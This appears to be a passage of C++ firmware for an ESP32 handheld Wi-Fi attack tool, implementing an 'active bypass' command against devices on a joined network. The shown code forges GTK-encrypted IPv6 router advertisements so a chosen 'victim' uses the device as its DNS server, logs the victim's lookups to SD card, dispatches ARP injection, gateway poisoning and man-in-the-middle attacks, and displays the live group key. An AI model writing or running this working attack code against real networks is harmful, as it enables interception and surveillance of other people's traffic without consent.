        esp_netif_create_ip6_linklocal(nif);
        for (int t = 0; t < 30 && !haveLL; t++) {
            esp_ip6_addr_t a;
            if (esp_netif_get_ip6_linklocal(nif, &a) == ESP_OK) { memcpy(ll, a.addr, 16); haveLL = true; break; }
            char k = inputHandler.getKeyboardInput();
            if (k == 'q' || k == 'Q') { dm.clearScreen(); return true; }   // aborted before start → menu
            vTaskDelay(pdMS_TO_TICKS(200));
        }
    }
    if (!haveLL) { dm.setTextColor(TFT_RED); dm.println("No IPv6 link-local."); dm.printCommandScreen(); return false; }

    // DNS query log (STA mode — plain SD I/O, no promiscuous here).
    File log; char path[40] = "";
    if (sdCardManager.isReady()) {
        sdCardManager.ensureDir(SD_DIR_ISOSCAN);
        uint16_t seq = 1;
        while (seq <= 999) { snprintf(path, sizeof(path), SD_DIR_ISOSCAN "/dns_%03u.csv", seq); if (!SD.exists(path)) break; seq++; }
        log = SD.open(path, FILE_WRITE);
        if (log) log.println("time_ms,src_ip,query");
    }
    // Dual-stack UDP:53 listener (IPv6 + IPv4) — the RA points the victim at us
    // over IPv6, so we must accept v6 queries, not just v4.
    s_dnsHead = s_dnsTail = 0;
    struct udp_pcb* dpcb = nullptr;
    LOCK_TCPIP_CORE();
    dpcb = udp_new_ip_type(IPADDR_TYPE_ANY);
    if (dpcb) { udp_bind(dpcb, IP_ANY_TYPE, 53); udp_recv(dpcb, isoDnsRecv, nullptr); }
    UNLOCK_TCPIP_CORE();

    const int RA_HIST = 5;
    uint64_t pn = 0x800000000000ULL; uint8_t keyid = 1; uint16_t seq = 0;
    uint32_t raSent = 0, dnsRx = 0, lastRA = 0;
    char hist[RA_HIST][44]; int histN = 0; bool histDirty = true;   // live query list
    uint32_t shownRA = 0xffffffff, shownDns = 0xffffffff; uint8_t shownKey = 0;
    char llShort[24]; snprintf(llShort, sizeof(llShort), "fe80::..%02x%02x", ll[14], ll[15]);

    auto chrome = [&]() {                             // static parts — drawn once
        if (dm.isBlocked()) return;
        int top = outputY + LINE_HEIGHT * 2;
        dm.fillRect(0, top, SCREEN_WIDTH, 240 - top, TFT_BLACK);
        dm.setTextColor(0x6FE8);       dm.setCursor(6, top);                       dm.printText("make victim use us as DNS; log its lookups");
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, outputY + LINE_HEIGHT * 3); dm.printText("our DNS");
        dm.setTextColor(TFT_YELLOW);   dm.setCursor(72, outputY + LINE_HEIGHT * 3); dm.printText(llShort);
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, outputY + LINE_HEIGHT * 5); dm.printText("log");
        dm.setTextColor(log ? 0x6FE8 : TFT_DARKGREY); dm.setCursor(72, outputY + LINE_HEIGHT * 5);
        dm.printText(log ? path : "(no SD - screen only)");
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, outputY + LINE_HEIGHT * 6); dm.printText("victim is reaching:");
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230);                       dm.printText("[k] keyid   [q] back to menu");
    };
    chrome();

    while (true) {
        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') break;
        if (k == 'k' || k == 'K') keyid = (keyid == 1) ? 2 : 1;

        if (millis() - lastRA >= 2000) {             // RAs are periodic — 2s is plenty
            lastRA = millis();
            uint8_t pnb[6]; for (int i = 0; i < 6; i++) pnb[i] = (uint8_t)((pn >> (8 * i)) & 0xff);
            uint8_t hdr[24]; isoBuildHdr(bssid, src, seq++, hdr);
            static const uint8_t m6[6] = { 0x33, 0x33, 0x00, 0x00, 0x00, 0x01 };
            memcpy(hdr + 4, m6, 6);                   // A1 = IPv6 all-nodes multicast
            uint8_t plain[128]; int plen = isoBuildRA(ll, plain);
            uint8_t enc[160];
            int elen = isoCcmpEncrypt(gtk, 16, hdr, keyid, pnb, plain, plen, enc, sizeof(enc));
            if (elen > 0) {
                uint8_t frame[192]; memcpy(frame, hdr, 24); memcpy(frame + 24, enc, elen);
                if (esp_wifi_80211_tx(WIFI_IF_STA, frame, 24 + elen, false) == ESP_OK) raSent++;
                pn++;
            }
        }

        // Drain DNS queries the lwip cb captured (v4 or v6) → list + SD log.
        while (s_dnsTail != s_dnsHead) {
            IsoDnsQ q;
            memcpy(&q, (const void*)&s_dnsRing[s_dnsTail], sizeof(q));
            s_dnsTail = (uint8_t)((s_dnsTail + 1) % 8);
            dnsRx++;
            if (histN < RA_HIST) histN++;
            else for (int i = 1; i < RA_HIST; i++) memcpy(hist[i - 1], hist[i], sizeof(hist[0]));
            strncpy(hist[histN - 1], q.dom, sizeof(hist[0]) - 1); hist[histN - 1][sizeof(hist[0]) - 1] = '\0';
            histDirty = true;
            if (log) {
                char line[100]; snprintf(line, sizeof(line), "%lu,%s,%s",
                    (unsigned long)millis(), q.src, q.dom);
                log.println(line); log.flush();
            }
        }

        if (LockScreenManager::getInstance().consumeJustUnlocked()) {
            chrome(); shownRA = shownDns = 0xffffffff; histDirty = true;
        }
        if (!dm.isBlocked()) {
            // counter line — repaint only when a value changed (no flicker)
            if (raSent != shownRA || dnsRx != shownDns || keyid != shownKey) {
                char b[56]; int yc = outputY + LINE_HEIGHT * 4;
                dm.fillRect(0, yc, SCREEN_WIDTH, LINE_HEIGHT, TFT_BLACK);
                snprintf(b, sizeof(b), "RA sent %lu (k%u)   DNS rcvd %lu",
                         (unsigned long)raSent, keyid, (unsigned long)dnsRx);
                dm.setTextColor(dnsRx ? TFT_GREEN : TFT_DARKGREY); dm.setCursor(6, yc); dm.printText(b);
                shownRA = raSent; shownDns = dnsRx; shownKey = keyid;
            }
            // live query list — repaint only when a new query arrived
            if (histDirty) {
                int yl = outputY + LINE_HEIGHT * 7;
                dm.fillRect(0, yl, SCREEN_WIDTH, 228 - yl, TFT_BLACK);
                for (int i = 0; i < histN; i++) {
                    dm.setTextColor(TFT_CYAN); dm.setCursor(12, yl + LINE_HEIGHT * i); dm.printText(hist[i]);
                }
                if (!histN) { dm.setTextColor(TFT_DARKGREY); dm.setCursor(12, yl); dm.printText("(none yet)"); }
                histDirty = false;
            }
        }
        vTaskDelay(pdMS_TO_TICKS(10));
    }

    if (dpcb) { LOCK_TCPIP_CORE(); udp_remove(dpcb); UNLOCK_TCPIP_CORE(); }
    if (log) log.close();
    dm.clearScreen(); return true;
}

// ── attack dispatch ──────────────────────────────────────────────────────────────
// Returns true → the attack ended cleanly (caller returns to the attack menu);
// false → a hard error occurred and the message + CLI prompt are already on screen
// (caller exits `is` entirely).
static bool isoRunAttack(int idx, IsoAttack attack) {
    auto& dm = displayManager;
    switch (attack) {
        case ISO_INJECT:   return isoInjectArp(idx);
        case ISO_PORTUP:   return isoGwPoison(idx);
        case ISO_MITM:     return isoMitm(idx);
        case ISO_BOUNCE:   return isoBounce(idx);
        case ISO_PORTDOWN: return isoPortDown(idx);
        case ISO_RADNS:    return isoRaDns(idx);
        case ISO_AUTO:     return isoSmartAuto(idx);
        default: break;                       // ISO_BCAST falls through
    }
    // bcast: a to-DS broadcast frame would need our PAIRWISE key (PTK) to be
    // accepted by the AP, which raw 80211_tx can't supply — so it's not separately
    // injectable. The same "is the victim reachable" question is answered by
    // 'inject' (GTK broadcast) and 'bounce' (IP layer via gateway).
    isoHeader("bcast");
    dm.setTextColor(TFT_YELLOW); dm.println("Not separately injectable:");
    dm.setTextColor(0x7BEF);     dm.println("a to-DS frame needs our pairwise");
    dm.println("key (PTK), which raw TX can't add.");
    dm.println("");
    dm.setTextColor(TFT_WHITE);  dm.println("Use 'inject' or 'bounce' instead");
    dm.println("to test victim reachability.");
    dm.println("");
    dm.setTextColor(TFT_DARKGREY); dm.println("any key -> back to menu");
    while (true) {
        if (inputHandler.getKeyboardInput()) break;
        if (LockScreenManager::getInstance().consumeJustUnlocked()) break;
        vTaskDelay(pdMS_TO_TICKS(30));
    }
    dm.clearScreen(); return true;
}

// ── is cctest — validate the CCMP engine on-device (no transmit) ─────────────────
// Runs the round-trip self-test, then shows the live GTK if associated. This is
// the safe way to prove the inject crypto works before any frame goes on the air.
static void isoCcmpTest() {
    auto& dm = displayManager;
    isoHeader("CCMP self-test");
    bool pass = isoCcmpSelfTest();
    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, outputY + LINE_HEIGHT * 2);
    dm.printText("AES-CCMP round-trip:");
    dm.setTextColor(pass ? TFT_GREEN : TFT_RED);
    dm.setCursor(6, outputY + LINE_HEIGHT * 3); dm.printText(pass ? "PASS" : "FAIL");

    uint8_t gtk[32]; int len = 0;
    int y = outputY + LINE_HEIGHT * 5;
    if (WiFi.status() == WL_CONNECTED && netspyGetGtk(gtk, &len)) {
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y); dm.printText("live GTK:"); y += LINE_HEIGHT;
        char row[48]; int n = 0;
        for (int i = 0; i < len; i++) {
            n += snprintf(row + n, sizeof(row) - n, "%02X ", gtk[i]);
            if ((i & 7) == 7) { dm.setTextColor(TFT_WHITE); dm.setCursor(10, y); dm.printText(row); y += LINE_HEIGHT; n = 0; }
        }
        if (n) { dm.setTextColor(TFT_WHITE); dm.setCursor(10, y); dm.printText(row); }
    } else {
        dm.setTextColor(0x7BEF); dm.setCursor(6, y);
        dm.printText(WiFi.status() == WL_CONNECTED ? "GTK unreadable (offset?)"
                                                   : "connect to see live GTK");
    }
    dm.printCommandScreen();
}

// ── entry ────────────────────────────────────────────────────────────────────────
void runIsoscan(char* args) {
    auto& dm = displayManager;
    if (args && (args[0] == 'c' || args[0] == 'C')) { isoCcmpTest(); return; }
    if (WiFi.status() != WL_CONNECTED) {
        isoHeader("active bypass");
        dm.setTextColor(TFT_RED);   dm.println("Connect first:  cw <ssid>");
        dm.setTextColor(0x7BEF);    dm.println("(needs to be on the target net)");
        dm.printCommandScreen();
        return;
    }
    if (netspyDeviceCount() <= 0) {
        isoHeader("active bypass");
        dm.setTextColor(TFT_RED);   dm.println("No devices discovered.");
        dm.setTextColor(0x7BEF);    dm.println("Run 'ns' first to find victims,");
        dm.setTextColor(0x7BEF);    dm.println("then 'is' to attack one.");
        dm.printCommandScreen();
        return;
    }

    // Parse args: optional `ns<#>` victim index + optional attack keyword.
    int victim = -1;
    IsoAttack pending = ISO_NONE;      // attack to run straight away (from the CLI)
    if (args && args[0]) {
        char buf[64]; strncpy(buf, args, sizeof(buf) - 1); buf[sizeof(buf) - 1] = '\0';
        for (char* tok = strtok(buf, " "); tok; tok = strtok(nullptr, " ")) {
            if ((tok[0] == 'n' || tok[0] == 'N') && (tok[1] == 's' || tok[1] == 'S') &&
                isdigit((unsigned char)tok[2])) {
                victim = atoi(tok + 2);
            } else {
                IsoAttack a = isoAttackFromKey(tok);
                if (a != ISO_NONE) pending = a;
            }
        }
    }

    // Navigation is a stack, so quitting one level steps back one level rather than
    // dropping out of the whole command:
    //   attack running --[q]--> attack menu --[q]--> victim picker --[q]--> CLI.
    // A victim given on the CLI has no picker to fall back to, so [q] at the menu
    // exits there instead.
    bool victimFromCli = (victim >= 0 && victim < netspyDeviceCount());
    while (true) {
        if (victim < 0 || victim >= netspyDeviceCount()) {
            victim = isoPickVictim();
            if (victim < 0) break;             // [q] at the picker → leave `is`
            victimFromCli = false;
        }

        // Attack-menu loop for the chosen victim.
        while (true) {
            IsoAttack a = pending; pending = ISO_NONE;   // CLI attack runs once, then menu
            if (a == ISO_NONE) {
                a = isoAttackMenu(victim);
                if (a == ISO_NONE) break;      // [q] at the menu → back to the picker
            }
            if (isoConfirm(victim, a)) {
                if (!isoRunAttack(victim, a)) return;     // hard error: msg + prompt already shown
            }
            // otherwise (attack finished or confirm cancelled) → redraw the menu
        }

        if (victimFromCli) break;              // CLI victim → no picker to return to
        victim = -1;                            // reopen the picker for another target
    }

    dm.clearScreen(); dm.printCommandScreen();
}
